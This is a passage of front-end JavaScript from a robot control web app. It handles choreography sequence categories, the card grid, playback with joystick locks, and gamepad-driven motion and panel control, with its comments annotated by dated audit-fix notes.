    input.maxLength = 32;
    labelSpan.replaceWith(input);
    input.focus(); input.select();
    let saving = false;
    const save = async () => {
      if (saving) return;
      saving = true;
      const newLabel = input.value.trim();
      if (!newLabel || newLabel === currentLabel) {
        // No change → restore the label span
        const restored = document.createElement('span');
        restored.className = 'seq-pill-label';
        restored.textContent = ' ' + currentLabel;
        input.replaceWith(restored);
        return;
      }
      try {
        const d = await api('/choreo/categories', 'POST',
          { action: 'update', id: catId, label: newLabel });
        if (d && d.status === 'ok') {
          toast(`Category renamed → ${newLabel}`, 'ok');
        } else {
          toast('Rename failed', 'error');
        }
      } catch { toast('Network error renaming category', 'error'); }
      await this.load();   // re-render with new label
    };
    input.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') save();
      if (e.key === 'Escape') {
        saving = true;
        const restored = document.createElement('span');
        restored.className = 'seq-pill-label';
        restored.textContent = ' ' + currentLabel;
        input.replaceWith(restored);
      }
    });
    input.addEventListener('blur', save);
    input.addEventListener('click', (e) => e.stopPropagation());   // don't select the category
  }

  onPillEmojiClick(event, catId) {
    event.stopPropagation();
    const cat = this._categories.find(c => c.id === catId);
    if (!cat) return;
    emojiPicker.open(cat.emoji, async (emoji) => {
      if (!emoji) return;
      // F-14 (audit 2026-05-15): surface success/failure so the
      // operator gets feedback. Previously the only signal was the
      // grid eventually re-rendering (or not, on failure).
      const d = await api('/choreo/categories', 'POST', { action: 'update', id: catId, emoji });
      if (!d) {
        toast('Failed to change emoji — admin re-auth may be needed', 'error');
        return;
      }
      toast(`Emoji updated for ${escapeHtml(cat.label || catId)}`, 'ok');
      await this.load();
    });
  }

  async createCategory() {
    const label = (prompt('Category name:') || '').trim();
    if (!label) return;
    // F-11 (audit 2026-05-15): client-side validation of the derived id
    // before opening the emoji picker. A label of '日本語' or '!!' used
    // to produce an empty id; backend then returned 400 but the user
    // had already clicked through the picker — wasted UI step.
    const id = label.toLowerCase().replace(/\s+/g, '_').replace(/[^a-z0-9_]/g, '');
    if (!id) {
      toast('Category name needs at least one a-z 0-9 _ character', 'error');
      return;
    }
    // F-12 (audit 2026-05-15): collision check before the picker.
    if (this._categories.some(c => c.id === id)) {
      toast(`Category id "${id}" already exists`, 'error');
      return;
    }
    emojiPicker.open('📦', async (emoji) => {
      const d = await api('/choreo/categories', 'POST',
                          { action: 'create', id, label, emoji: emoji || '📦' });
      if (!d) {
        toast('Create category failed — admin re-auth may be needed', 'error');
        return;
      }
      toast(`Category "${label}" created`, 'ok');
      await this.load();
    });
  }

  async deleteCategory(event, catId) {
    event.stopPropagation();
    const cat = this._categories.find(c => c.id === catId);
    // F-18 (audit 2026-05-15): refresh _scripts before showing the
    // confirm so the displayed count reflects what's actually on the
    // server NOW, not a 0-15s-old snapshot. A category could have
    // received new sequences from another tab/client since the last
    // poll → the operator deserves to know the real impact before
    // clicking yes.
    await this.load();
    const count = this._scripts.filter(s => s.category === catId).length;
    const msg = count > 0
      ? `Delete "${cat.label}"? ${count} sequence(s) will move to New Choreo.`
      : `Delete "${cat.label}"?`;
    if (!confirm(msg)) return;
    // F-13 (audit 2026-05-15): inspect the response so admin failures
    // (401, 403) don't silently no-op. The await was already present
    // but the return value was discarded — null returns flowed through
    // to the success path.
    const d = await api('/choreo/categories', 'POST', { action: 'delete', id: catId });
    if (!d) {
      toast(`Failed to delete "${cat.label}" — admin re-auth may be needed`, 'error');
      return;
    }
    toast(`Category "${cat.label}" deleted`, 'ok');
    if (this._activeCategory === catId) this._activeCategory = 'all';
    await this.load();
  }

  // ── Grid ──────────────────────────────────────────────────────

  _renderGrid() {
    const grid = el('seq-grid');
    if (!grid) return;
    const isAdmin = adminGuard.unlocked;
    const scripts = this._activeCategory === 'all'
      ? this._scripts
      : this._scripts.filter(s => s.category === this._activeCategory);

    grid.replaceChildren();

    // WOW polish G2 2026-05-15: empty state guidance instead of
    // a blank grid. Operator sees clear "nothing here yet" message.
    if (scripts.length === 0) {
      const empty = document.createElement('div');
      empty.className = 'seq-grid-empty';
      const icon = document.createElement('div');
      icon.className = 'seq-grid-empty-icon';
      icon.textContent = this._activeCategory === 'all' ? '🎬' : '📂';
      const title = document.createElement('div');
      title.className = 'seq-grid-empty-title';
      const sub = document.createElement('div');
      sub.className = 'seq-grid-empty-sub';
      if (this._activeCategory === 'all') {
        title.textContent = this._scripts.length === 0
          ? 'No sequences yet'
          : 'No sequences match the current filter';
        sub.textContent = isAdmin
          ? 'Open the editor and click + NEW to record your first.'
          : 'Ask an admin to create sequences.';
      } else {
        const catLabel = (this._categories.find(c => c.id === this._activeCategory)?.label) || this._activeCategory;
        title.textContent = `No sequences in ${catLabel}`;
        sub.textContent = isAdmin
          ? 'Switch to ALL to drag sequences here, or click another category.'
          : 'Try another category.';
      }
      empty.append(icon, title, sub);
      grid.appendChild(empty);
      return;
    }
    // PERF-M2 fix 2026-05-16: hoist localStorage read OUT of the
    // forEach. 48 cards × sync IPC read = waste. Read once.
    let _lastPlayed = null;
    _lastPlayed = _lsGet('astromech-last-choreo');
    scripts.forEach(s => {
      const isRunning = this._running.has(s.name);
      const isLooping = this._looping.has(s.name);
      // F-29: preserve casing
      const label = s.label || s.name.replace(/_/g, ' ');
      const card = document.createElement('div');
      card.className = 'seq-card'
        + (isRunning ? ' running' : '')
        + (isLooping ? ' looping' : '')
        + (s.name === _lastPlayed ? ' last-played' : '');
      card.id = 'seq-card-' + s.name;
      card.dataset.name = s.name;
      // F-4 (audit 2026-05-15): use ?? not || so a sequence with a real
      // 0-duration (e.g. just-saved empty .chor) doesn't get the 5s
      // placeholder — the progress bar would otherwise fill to 100%
      // over 5s for a sequence that actually finishes instantly.
      card.dataset.duration = String(s.duration ?? 5);

      // WOW polish 2026-05-15: native title tooltip with metadata —
      // duration + track count + category. Hover reveals at-a-glance
      // info without having to open the editor. Desktop UX win;
      // touchscreens see the same info on long-press via the existing
      // long-press handler. Compact format keeps tooltip short.
      {
        const dur = (s.duration ?? 0).toFixed(1);
        const trackCount = (s.audio_count ?? 0) + (s.dome_count ?? 0)
                         + (s.body_count ?? 0) + (s.lights_count ?? 0);
        const parts = [`⏱ ${dur}s`];
        if (trackCount > 0) parts.push(`${trackCount} events`);
        if (s.category && s.category !== 'all') parts.push(`📁 ${s.category}`);
        card.title = `${s.name}\n${parts.join('  ·  ')}`;
      }

      if (isAdmin) {
        const handle = document.createElement('div');
        handle.className = 'seq-card-handle';
        handle.textContent = '⠿';
        // L3 fix 2026-05-16: clarify the handle's purpose. It's not
        // wired to anything itself — the card body is the drag origin —
        // but the icon advertises 'this is draggable'. Title makes the
        // affordance explicit (was: looked like an unwired UI element).
        handle.title = 'Drag onto a category pill to recategorize';
        card.appendChild(handle);
      }

      const loop = document.createElement('span');
      loop.className = 'seq-card-loop';
      loop.textContent = '🔄';
      card.appendChild(loop);

      const emoji = document.createElement('span');
      emoji.className = 'seq-card-emoji';
      emoji.textContent = s.emoji || '';   // textContent neutralises any payload
      card.appendChild(emoji);

      const wave = document.createElement('div');
      wave.className = 'seq-card-wave';
      wave.innerHTML = '<span></span>'.repeat(6);
      card.appendChild(wave);

      const lbl = document.createElement('span');
      lbl.className = 'seq-card-label';
      lbl.textContent = label;
      card.appendChild(lbl);

      // WOW S2 fix 2026-05-16: visible pre-play indicator for sequences
      // that lock joysticks. Operator sees the icon BEFORE tapping play,
      // knows the bot will move. Wheel = propulsion, dome arc = dome
      // motor rotation. Both = scary, gets both icons.
      if (s.uses_propulsion || s.uses_dome) {
        const flags = document.createElement('span');
        flags.className = 'seq-card-locks';
        if (s.uses_propulsion) {
          const w = document.createElement('span');
          w.className = 'seq-card-lock seq-card-lock-prop';
          w.textContent = '🚗';
          w.title = 'Uses propulsion — joystick will lock';
          flags.appendChild(w);
        }
        if (s.uses_dome) {
          const d = document.createElement('span');
          d.className = 'seq-card-lock seq-card-lock-dome';
          d.textContent = '↻';
          d.title = 'Uses dome motor — dome joystick will lock';
          flags.appendChild(d);
        }
        card.appendChild(flags);
      }

      // WOW S8 fix 2026-05-16: always-visible metadata footer for touch.
      // Native title tooltip is hover-only — useless on tablet. Compact
      // footer line under the label shows duration + event count when
      // not running. Hidden during play (the wave + progress take over).
      const meta = document.createElement('div');
      meta.className = 'seq-card-meta';
      const trackCount2 = (s.audio_count ?? 0) + (s.dome_count ?? 0)
                       + (s.body_count ?? 0) + (s.lights_count ?? 0);
      meta.textContent = `⏱${(s.duration ?? 0).toFixed(1)}s · ${trackCount2}evt`;
      card.appendChild(meta);

      const progWrap = document.createElement('div');
      progWrap.className = 'seq-card-progress';
      const progFill = document.createElement('div');
      progFill.className = 'seq-card-progress-fill';
      progFill.id = 'seq-prog-' + s.name;
      progWrap.appendChild(progFill);
      card.appendChild(progWrap);

      if (isAdmin) {
        const play = document.createElement('div');
        play.className = 'seq-card-play';
        play.textContent = '▶';
        play.addEventListener('click', (e) => this.play(e, s.name));
        card.appendChild(play);
      }

      grid.appendChild(card);
    });

    this._attachCardEvents(grid, isAdmin);
  }

  _attachCardEvents(grid, isAdmin) {
    grid.querySelectorAll('.seq-card').forEach(card => {
      const name = card.dataset.name;

      if (isAdmin) {
        const emojiEl = card.querySelector('.seq-card-emoji');
        emojiEl.addEventListener('click', (e) => {
          e.stopPropagation();
          const s = this._scripts.find(x => x.name === name);
          emojiPicker.open(s.emoji, async (emoji) => {
            await api('/choreo/set-emoji', 'POST', { name, emoji });
            await this.load();
          });
        });

        const labelEl = card.querySelector('.seq-card-label');
        labelEl.addEventListener('click', (e) => {
          e.stopPropagation();
          this._startRename(card, name);
        });

        this._attachDrag(card, name);

      } else {
        card.addEventListener('pointerdown', (e) => this._onPointerDown(e, name));
        card.addEventListener('pointerup',   (e) => this._onPointerUp(e, name));
        card.addEventListener('pointermove', (e) => this._onPointerMove(e));
        card.addEventListener('pointercancel', (e) => this._clearLongPress(e));
        // Audit finding Frontend M-3 2026-05-15: pointerleave on
        // browsers that don't fire pointercancel when a finger slides
        // off the card (Chrome variant behavior). Without this, the
        // 500ms long-press timer can fire after the user's finger has
        // already left the card → unwanted play(name, loop=true).
        card.addEventListener('pointerleave', (e) => this._clearLongPress(e));
      }
    });
  }

  // ── Long press (normal mode) ──────────────────────────────────

  // F-15 / F-16 (audit 2026-05-15): long-press state is now tracked
  // per-pointer in a single Map instead of a shared _longPressTimer.
  // F-15: 1px touchscreen jitter used to cancel the long-press
  // immediately — we now require an 8px movement threshold before
  // cancelling, matching the admin-mode drag threshold below.
  // F-16: a second pointerdown on a different card (multi-finger
  // touch) used to overwrite the shared timer reference, leaking
  // the first card's pending fire and silently dropping its
  // long-press. The Map keyed by pointerId makes each touch
  // independent.
  _onPointerDown(e, name) {
    if (!this._longPress) this._longPress = new Map();
    const state = {
      timer: setTimeout(() => {
        state.timer = null;
        this.play(e, name, true);
      }, 500),
      startX: e.clientX,
      startY: e.clientY,
      name,
    };
    this._longPress.set(e.pointerId, state);
  }

  _onPointerUp(e, name) {
    const state = this._longPress && this._longPress.get(e.pointerId);
    if (!state) return;
    this._longPress.delete(e.pointerId);
    if (state.timer) {
      clearTimeout(state.timer);
      if (this._running.has(name)) this.stop(name);
      else this.play(e, name, false);
    }
  }

  _onPointerMove(e) {
    const state = this._longPress && this._longPress.get(e.pointerId);
    if (!state || !state.timer) return;
    const dx = Math.abs(e.clientX - state.startX);
    const dy = Math.abs(e.clientY - state.startY);
    if (dx > 8 || dy > 8) {
      clearTimeout(state.timer);
      state.timer = null;
    }
  }

  _clearLongPress(e) {
    // Called on pointercancel — if `e` isn't passed (e.g. legacy
    // callers), nuke every pending timer.
    if (!this._longPress) return;
    if (e && e.pointerId !== undefined) {
      const state = this._longPress.get(e.pointerId);
      if (state && state.timer) clearTimeout(state.timer);
      this._longPress.delete(e.pointerId);
    } else {
      for (const [, st] of this._longPress) {
        if (st.timer) clearTimeout(st.timer);
      }
      this._longPress.clear();
    }
  }

  // ── Admin drag to pill ────────────────────────────────────────

  _attachDrag(card, name) {
    let pressed  = false;
    let dragging = false;
    let startX = 0, startY = 0;
    let ghost = null;

    const cleanup = () => {
      pressed  = false;
      dragging = false;
      scriptEngine._dragActive = false;
      card.classList.remove('dragging');
      if (ghost) { ghost.remove(); ghost = null; }
      document.querySelectorAll('.seq-pill').forEach(p => p.classList.remove('drop-target'));
      window.removeEventListener('pointerup',     _winUp);
      window.removeEventListener('pointercancel', cleanup);
    };

    // F-23 (audit 2026-05-15): single drop handler used by both the
    // card's pointerup AND the window-level fallback. Previously the
    // identical drop logic was inlined twice (15 lines × 2), making
    // updates error-prone — the F-24 label fix had to be applied to
    // both paths. _handleDrop centralises it so a future change has
    // one place to touch.
    const _handleDrop = (clientX, clientY) => {
      if (!dragging) { cleanup(); return; }
      cleanup();
      const target = document.elementFromPoint(clientX, clientY);
      const pill = target?.closest('.seq-pill[data-cat]');
      if (!pill || pill.dataset.cat === 'all') return;
      const cat = this._categories.find(c => c.id === pill.dataset.cat);
      const display = cat?.label || pill.dataset.cat;
      // EDGE-L1 fix 2026-05-16: optimistic local mutation instead of
      // full reload. Old code refetched both /choreo/list and
      // /choreo/categories just to flip one card's category — wasted
      // bandwidth + full grid rebuild flicker. Now: mutate the
      // _scripts entry in-place + targeted re-render. Status poll
      // catches divergence within 2s if the POST failed somehow.
      const newCat = pill.dataset.cat;
      const meta = this._scripts.find(s => s.name === name);
      const oldCat = meta?.category;
      if (meta) meta.category = newCat;
      // Re-render the grid (cheap — uses cached _scripts) so the card
      // visually moves to/from the active category view immediately.
      this._renderPills();
      this._renderGrid();
      api('/choreo/set-category', 'POST', { name, category: newCat })
        .then(d => {
          if (!d) {
            // Rollback on failure.
            if (meta) meta.category = oldCat;
            this._renderPills();
            this._renderGrid();
            toast(`Failed to move to ${display} — admin re-auth may be needed`, 'error');
            return;
          }
          toast(`Moved to ${display}`, 'ok');
        });
    };

    // Window-level fallback: fires even if the card element is removed
    // from the DOM (e.g. periodic reload destroys the card mid-drag).
    const _winUp = (e) => _handleDrop(e.clientX, e.clientY);

    card.addEventListener('pointerdown', (e) => {
      pressed = true;
      startX = e.clientX; startY = e.clientY;
      // Do NOT setPointerCapture here — it breaks child click events (emoji, label, play btn)
    });

    card.addEventListener('pointermove', (e) => {
      if (!pressed) return;
      const dx = Math.abs(e.clientX - startX);
      const dy = Math.abs(e.clientY - startY);
      if (!dragging && (dx > 8 || dy > 8)) {
        dragging = true;
        scriptEngine._dragActive = true;
        card.setPointerCapture(e.pointerId);
        card.classList.add('dragging');
        document.querySelectorAll('.seq-pill[data-cat]:not([data-cat="all"])').forEach(p => {
          p.classList.add('drop-target');
        });
        ghost = document.createElement('div');
        ghost.style.cssText = 'position:fixed;pointer-events:none;z-index:9999;opacity:0.8;font-size:28px;';
        ghost.textContent = card.querySelector('.seq-card-emoji').textContent;
        document.body.appendChild(ghost);
        // Register window fallback in case card element is destroyed mid-drag
        window.addEventListener('pointerup',     _winUp,   { once: true });
        window.addEventListener('pointercancel', cleanup,  { once: true });
      }
      if (dragging && ghost) {
        ghost.style.left = (e.clientX - 16) + 'px';
        ghost.style.top  = (e.clientY - 16) + 'px';
      }
    });

    card.addEventListener('pointerup', (e) => {
      // If card is still in DOM, remove the window fallback (it would
      // double-fire) and delegate to the same _handleDrop logic.
      window.removeEventListener('pointerup',     _winUp);
      window.removeEventListener('pointercancel', cleanup);
      if (!dragging) { pressed = false; return; }
      _handleDrop(e.clientX, e.clientY);
    });

    card.addEventListener('pointercancel', cleanup);
  }

  // ── Inline rename ─────────────────────────────────────────────

  _startRename(card, name) {
    // M1 fix 2026-05-16: track the rename in progress so the 15s
    // periodic reload doesn't destroy the inline input mid-edit
    // (would fire blur with partial value). Cleared in save()/Escape.
    this._renamingName = name;
    const labelEl = card.querySelector('.seq-card-label');
    const current = labelEl.textContent;
    const input = document.createElement('input');
    input.className = 'input-text';
    input.maxLength = 64;  // L1 fix: match server _LABEL_MAX_LEN
    input.style.cssText = 'width:100%;font-size:10px;padding:2px 4px;text-align:center;';
    input.value = current;
    labelEl.replaceWith(input);
    input.focus(); input.select();

    // F-10 (audit 2026-05-15): one-shot guard. Pressing Enter calls
    // save() AND fires blur on the focused input → save() fires twice.
    // Backend serialises both via _chor_file_lock so no data is lost,
    // but the second `await this.load()` resolves AFTER the first and
    // briefly flickers the grid. The flag short-circuits the second
    // path without changing the keyboard-only/blur-only UX.
    let saving = false;
    const save = async () => {
      if (saving) return;
      saving = true;
      const newLabel = input.value.trim();
      await api('/choreo/set-label', 'POST', { name, label: newLabel });
      // Audit finding Frontend L-C 2026-05-15: keep the editor's
      // in-memory _chor.meta.label in sync if the same choreo is
      // currently open in the editor. Without this, the editor's
      // next Save POSTs the old label and the rename is silently
      // reverted.
      try {
        if (typeof choreoEditor !== 'undefined' && choreoEditor._chorRef) {
          const ref = choreoEditor._chorRef();
          if (ref && ref.meta && ref.meta.name === name) {
            ref.meta.label = newLabel;
          }
        }
      } catch {}
      this._renamingName = null;   // M1 fix: clear guard
      await this.load();
    };
    input.addEventListener('keydown', e => {
      if (e.key === 'Enter') save();
      if (e.key === 'Escape') {
        saving = true;
        this._renamingName = null;   // M1 fix: clear guard
        const restored = document.createElement('span');
        restored.className = 'seq-card-label';
        restored.textContent = current;
        input.replaceWith(restored);
      }
    });
    input.addEventListener('blur', save);
  }

  // ── Playback ──────────────────────────────────────────────────

  play(event, name, loop = false) {
    if (event && event.stopPropagation) event.stopPropagation();
    // M2 fix 2026-05-16: single-instance player — clear any other
    // 'running' state first so two quick clicks don't show two cards
    // running (backend serializes via _play_lock, only the second
    // actually plays).
    if (this._running.size > 0) {
      this._running.forEach(prev => {
        if (prev !== name) {
          const prevCard = el(`seq-card-${prev}`);
          if (prevCard) {
            prevCard.classList.remove('running', 'looping');
            const fill = el(`seq-prog-${prev}`);
            if (fill) { fill.style.transition = 'none'; fill.style.width = '0%'; }
          }
        }
      });
      this._running.clear();
      this._looping.clear();
    }
    this._running.add(name);
    if (loop) this._looping.add(name); else this._looping.delete(name);
    const card = el(`seq-card-${name}`);
    if (card) {
      card.classList.add('running');
      card.classList.toggle('looping', loop);
      this._startProgress(card, name);
    }
    // 2026-05-15: optimistic joystick lock — call the canonical
    // _setChoreoLockUI which sets BOTH the CSS classes AND the JS
    // vars (_choreoPropLocked etc.) that the joystick onMove handlers
    // gate on. Previous version only added CSS classes → JS vars stayed
    // false → operator could drive during the 2s status poll window
    // even though the UI said "locked". Bug C1 fix 2026-05-15.
    const meta = this._scripts.find(s => s.name === name);
    if (meta && (meta.uses_propulsion || meta.uses_dome)) {
      _setChoreoLockUI(!!meta.uses_propulsion, !!meta.uses_dome, name);
    }
    // EDGE-H3 fix 2026-05-16: .catch() for network drops mid-call.
    // api() returns null on non-2xx but THROWS on AbortError /
    // network failure → without .catch the optimistic _running.add
    // never gets rolled back → card stuck running until next /status
    // poll. Same rollback path as the if(!d) branch.
    const rollback = () => {
      this._running.delete(name);
      this._looping.delete(name);
      if (card) {
        card.classList.remove('running', 'looping');
        const fill = el(`seq-prog-${name}`);
        if (fill) { fill.style.transition = 'none'; fill.style.width = '0%'; }
      }
      if (meta && (meta.uses_propulsion || meta.uses_dome)) {
        _setChoreoLockUI(false, false, '');
      }
    };
    api('/choreo/play', 'POST', { name, loop }).then(d => {
      if (!d) {
        rollback();
        toast(`Failed to start ${name.toUpperCase()} — see logs`, 'error');
      } else {
        toast(`${loop ? '🔄 ' : '▶ '}${name.toUpperCase()} playing`, 'ok');
        // WOW polish 2026-05-15: persist last-played for the marker.
        _lsSet('astromech-last-choreo', name);
        document.querySelectorAll('.seq-card.last-played')
          .forEach(c => c.classList.remove('last-played'));
        if (card) card.classList.add('last-played');
        poller.poll();
        // Audit reclass C1 (Perf L-3) 2026-05-15: the status poller
        // runs at 2s, so a choreo shorter than 2s ends server-side
        // but the card stays "running" for up to 2s after. Operator
        // sees stale highlight → "did it fire?". Server's play
        // response includes `duration` — schedule a self-clear at
        // duration + 500ms safety so the highlight tracks the real
        // playback end within 500ms instead of 2s. Loop mode is
        // exempt (no fixed end). Status poll still clears for any
        // edge case (abort, manual stop) on its own cadence.
        if (!loop && d.duration && isFinite(d.duration) && d.duration > 0) {
          const ms = Math.ceil(d.duration * 1000) + 500;
          setTimeout(() => {
            // Only clear if we still think it's the running one
            // (avoid wiping a newer playback started in between).
            if (this._running.has(name)) {
              this._running.delete(name);
              this._looping.delete(name);
              const c = el(`seq-card-${name}`);
              if (c) c.classList.remove('running', 'looping');
              poller.poll();   // confirm with the server
            }
          }, ms);
        }
      }
    }).catch(() => {
      // EDGE-H3 fix 2026-05-16: catch the throw path (AbortError /
      // network drop). Without this the optimistic _running.add would
      // leak — card stuck running for up to 2s until /status sync.
      rollback();
      toast(`Network drop — ${name.toUpperCase()} state may be stale`, 'warn');
    });
  }

  stop(name) {
    // F-7 (audit 2026-05-15): clear EVERY running card class, not just
    // the one the user clicked. The single-instance ChoreoPlayer means
    // only one sequence is ever actually playing — but if the running
    // highlight had drifted to a different card (e.g. after a rename
    // race or a status poll lag), clicking 'stop' on the visible-but-
    // wrong card used to leave the actually-playing card stuck visually.
    // Now we clear the whole _running/_looping state and let the next
    // status poll re-add the correct entry if anything is still going.
    api('/choreo/stop', 'POST').then(d => {
      if (!d) {
        // F-6 mirror — never silently swallow a stop failure.
        toast('Failed to stop — see logs', 'error');
        return;
      }
      this._running.clear();
      this._looping.clear();
      document.querySelectorAll('.seq-card.running, .seq-card.looping')
        .forEach(c => c.classList.remove('running', 'looping'));
      toast(`${name.toUpperCase()} stopped`, 'ok');
    });
  }

  stopAll() {
    // F-26 (audit 2026-05-15): defer ALL DOM updates to updateRunning(),
    // which is the single writer for #running-scripts and the .running /
    // .looping classes. Previously stopAll did the DOM ops itself AND
    // the poller also did them → two writers for the same elements,
    // hard to reason about when output diverges. Now stopAll just
    // touches the in-memory sets and calls updateRunning([]) to flush;
    // the next status poll re-syncs from the server.
    api('/choreo/stop', 'POST').then(d => {
      if (!d) { toast('Failed to stop sequences — see logs', 'error'); return; }
      this._looping.clear();
      this.updateRunning([]);
      toast('Sequences stopped', 'ok');
    });
  }

  _startProgress(card, name) {
    const fill = el(`seq-prog-${name}`);
    if (!fill) return;
    // EDGE-H4 fix 2026-05-16: `|| 5` treats a real 0-duration choreo
    // (just-saved empty .chor) as 5s placeholder, animating the
    // progress bar for nothing → highlight stuck for 5s. Use isFinite
    // + >0 check; instant-finish choreos snap fill to 100% and the
    // self-clear timer in play() will clean up.
    const dur = parseFloat(card.dataset.duration);
    fill.style.transition = 'none';
    fill.style.width = '0%';
    if (!isFinite(dur) || dur <= 0) {
      // Instant finish — show full bar momentarily and let the
      // status poll / self-clear timer remove the running highlight.
      requestAnimationFrame(() => { fill.style.width = '100%'; });
      return;
    }
    requestAnimationFrame(() => {
      fill.style.transition = `width ${dur}s linear`;
      fill.style.width = '100%';
    });
  }

  updateRunning(running) {
    const names = new Set(running.map(s => s.name));
    // PERF-M1 fix 2026-05-16: short-circuit when nothing changed.
    // Avoids the 48-card querySelectorAll + per-card class toggle
    // walk every 2s status poll.
    const prev = this._running || new Set();
    const sameSet = (prev.size === names.size)
                  && [...names].every(n => prev.has(n));
    if (sameSet) return;
    // WOW polish G5 2026-05-15: scroll the newly-running card into
    // view if it's off-screen.
    // M3 fix 2026-05-16: also start the progress bar for sequences
    // triggered externally (BT pad, shortcut, behavior engine) —
    // updateRunning is the only path that catches those, but the
    // old code only toggled .running class without animating the
    // bar → operator saw highlight but bar stayed at 0%.
    for (const name of names) {
      if (!prev.has(name)) {
        const card = el(`seq-card-${name}`);
        if (card && typeof card.scrollIntoView === 'function') {
          card.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
        }
        if (card) this._startProgress(card, name);
      }
    }
    this._running = names;
    // F-39 (audit 2026-05-15): the `_looping` set used to accumulate
    // names whose cards were hidden by the current category filter
    // (the visible-card forEach below couldn't clean them up). Reset
    // it from the server-reported running list which is authoritative:
    // anything actually playing AND looping will be re-added by the
    // poller's next /choreo/status query; anything else gets dropped.
    // We keep _looping membership for currently-running names so the
    // looping CSS class survives the poll round-trip.
    for (const stale of [...this._looping]) {
      if (!names.has(stale)) this._looping.delete(stale);
    }
    document.querySelectorAll('.seq-card').forEach(card => {
      const name = card.dataset.name;
      const isRunning = names.has(name);
      card.classList.toggle('running', isRunning);
      if (!isRunning) {
        card.classList.remove('looping');
        // F-40 (audit 2026-05-15): the progress fill is a CHILD of the
        // card we're already iterating — querySelector inside the card
        // is faster than another getElementById walk of the document.
        const fill = card.querySelector('.seq-card-progress-fill');
        if (fill) { fill.style.transition = 'none'; fill.style.width = '0%'; }
      }
    });
    // F-33 (audit 2026-05-15): the single-instance ChoreoPlayer means
    // `running` always has 0 or 1 entry. Drop the `.join(', ')` since
    // it implied a multi-running case that never happens.
    // S6 fix 2026-05-16: show the user-friendly label, not the raw
    // filename. The card already displays the label; the ACTIVE strip
    // showing 'idle_dome_loop' while the card says 'Idle Dome' was
    // an inconsistency.
    const list = el('running-scripts');
    if (list) {
      if (running.length) {
        const nm = running[0].name;
        const meta = this._scripts.find(s => s.name === nm);
        list.textContent = (meta && meta.label) || nm.replace(/_/g, ' ');
      } else {
        list.textContent = '—';
      }
    }
    // S1 fix 2026-05-16: show/hide the STOP button. Visible when
    // anything is playing — single tap to halt instead of long-press
    // a buried card.
    const stopBtn = el('seq-stop-btn');
    if (stopBtn) stopBtn.style.display = running.length ? 'inline-block' : 'none';
  }

  _syncAdminMode() {
    this._renderPills();
    this._renderGrid();
  }
}

const scriptEngine = new ScriptEngine();

async function loadScripts() { await scriptEngine.load(); }

// ================================================================
// BT Controller
// ================================================================

class BTController {
  constructor() {
    this._connected   = false;
    this._piConnected = false;
    this._piEnabled   = true;
    this._batteryPct  = 0;
    this._rssi        = null;
    this._gamepadIdx  = null;
    this._prevBtns    = {};
    this._driveActive = false;
    this._domeActive  = false;
    this._lastDriveMs = 0;
    this._lastDomeMs  = 0;
    this._DRIVE_HZ    = 1000 / 30;   // 30 req/s
    this._DOME_HZ     = 1000 / 20;   // 20 req/s
    this._loadMappings();
    this._bind();
  }

  _bind() {
    window.addEventListener('gamepadconnected',    e => this._onConnect(e.gamepad));
    window.addEventListener('gamepaddisconnected', e => this._onDisconnect(e.gamepad));
    const poll = () => { this._tick(); requestAnimationFrame(poll); };
    requestAnimationFrame(poll);
  }

  _onConnect(gp) {
    this._gamepadIdx = gp.index;
    this._connected  = true;
    this._prevBtns   = {};
    this._setUI(true, gp.id.split('(')[0].trim().slice(0, 24));
    toast('BT controller connected', 'ok');
  }

  _onDisconnect(gp) {
    if (gp.index !== this._gamepadIdx) return;
    this._gamepadIdx  = null;
    this._connected   = false;
    this._driveActive = false;
    this._domeActive  = false;
    this._setUI(false, '—');
    api('/motion/stop',      'POST');
    api('/motion/dome/stop', 'POST');
    jsLeft.setExternal(0, 0);    // reset knobs visuels
    jsRight.setExternal(0, 0);
    toast('BT controller disconnected', 'error');
  }

  _tick() {
    const pads = navigator.getGamepads ? navigator.getGamepads() : [];

    // Auto-détection si pas encore associée
    if (this._gamepadIdx === null) {
      for (let i = 0; i < pads.length; i++) {
        if (pads[i]) { this._onConnect(pads[i]); break; }
      }
    }
    if (this._gamepadIdx === null) return;

    const gp = pads[this._gamepadIdx];
    if (!gp) {
      if (this._connected) this._onDisconnect({ index: this._gamepadIdx });
      return;
    }

    const m   = this._getMappings();
    const dz  = (parseInt(m.deadzone) || 8) / 100;
    const now = performance.now();

    // ── PROPULSION — bloquée en Child Lock (mode 2) ────────────────
    const tRaw = -this._axis(gp, m.throttle || 'L_STICK_Y');
    const sRaw =  this._axis(gp, m.steer    || 'L_STICK_X');
    const t    = Math.abs(tRaw) > dz ? tRaw * _speedLimit : 0;
    const s    = Math.abs(sRaw) > dz ? sRaw * _speedLimit * 0.55 : 0;

    // Sync visuel joystick gauche — toujours, même en Child Lock
    jsLeft.setExternal(Math.abs(sRaw) > dz ? sRaw : 0,
                       Math.abs(tRaw) > dz ? -tRaw : 0);

    if (!lockMgr.isDriveLocked()) {
      if (now - this._lastDriveMs >= this._DRIVE_HZ) {
        this._lastDriveMs = now;
        if (Math.abs(t) > 0.01 || Math.abs(s) > 0.01) {
          _postMotion('/motion/arcade', { throttle: t, steering: s });
          this._driveActive = true;
        } else if (this._driveActive) {
          api('/motion/stop', 'POST');
          this._driveActive = false;
        }
      }
    } else if (this._driveActive) {
      // Child Lock activé en cours de conduite → arrêt immédiat
      api('/motion/stop', 'POST');
      this._driveActive = false;
    }

    // ── DÔME ──────────────────────────────────────────────────────
    const dRaw = this._axis(gp, m.dome || 'R_STICK_X');

    // Sync visuel joystick droit
    jsRight.setExternal(Math.abs(dRaw) > dz ? dRaw : 0, 0);

    if (now - this._lastDomeMs >= this._DOME_HZ) {
      this._lastDomeMs = now;
      if (Math.abs(dRaw) > dz) {
        _postMotion('/motion/dome/turn', { speed: dRaw * 0.85 });
        this._domeActive = true;
      } else if (this._domeActive) {
        api('/motion/dome/stop', 'POST');
        this._domeActive = false;
      }
    }

    // ── BOUTONS — détection de front montant/descendant ───────────
    const prev = this._prevBtns;

    // Panneau dôme : ouvert tant qu'appuyé
    const p1 = m.panel1 || 'SQUARE';
    const p1v = this._btn(gp, p1);
    if (p1v && !prev[p1])  api('/servo/dome/open_all',  'POST');
    if (!p1v && prev[p1])  api('/servo/dome/close_all', 'POST');
    prev[p1] = p1v;

    // Panneau body : ouvert tant qu'appuyé
    const p2 = m.panel2 || 'TRIANGLE';
    const p2v = this._btn(gp, p2);
    if (p2v && !prev[p2])  api('/servo/body/open_all',  'POST');
    if (!p2v && prev[p2])  api('/servo/body/close_all', 'POST');
    prev[p2] = p2v;

    // Son aléatoire — front montant seulement
